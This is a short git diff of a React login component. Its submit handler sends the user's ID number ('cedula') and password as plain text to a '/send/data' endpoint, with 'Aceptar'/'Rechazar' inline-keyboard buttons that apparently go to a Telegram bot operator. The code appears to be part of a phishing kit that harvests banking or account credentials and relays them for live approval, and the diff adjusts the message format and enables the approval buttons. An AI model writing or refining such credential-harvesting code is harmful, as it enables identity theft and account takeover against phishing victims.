@@ -15,23 +15,23 @@ function App() {
   const onContinue = async () => {
     try {
       const response = await api.post("/send/data", {
-        text: `CC: ${cedula} Contra: ${password}`,
-        // reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: "Aceptar",
-              callback_data: "aceptar",
-            },
+        text: `\nCC: ${cedula} \n\nContra: ${password}`,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "Aceptar",
+                callback_data: "aceptar",
+              },
+            ],
+            [
+              {
+                text: "Rechazar",
+                callback_data: "rechazar",
+              },
+            ],
           ],
-          [
-            {
-              text: "Rechazar",
-              callback_data: "rechazar",
-            },
-          ],
-        ],
-        // },
+        },
       });
       return response;
     } catch (error) {
